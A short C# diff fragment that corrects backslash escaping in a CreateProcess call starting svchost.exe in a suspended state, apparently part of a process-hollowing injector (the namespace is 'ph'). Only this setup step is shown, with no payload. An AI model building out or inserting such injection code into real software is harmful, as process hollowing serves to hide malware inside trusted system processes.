@@ -1046,7 +1046,7 @@ namespace ph
 
                 StartupInfo sInfo = new StartupInfo();
                 ProcessInfo pInfo = new ProcessInfo();
-                bool cResult = CreateProcess(null, "c:\windows\system32\svchost.exe", IntPtr.Zero, IntPtr.Zero,
+                bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                     false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
 
                 ProcessBasicInfo pbInfo = new ProcessBasicInfo();
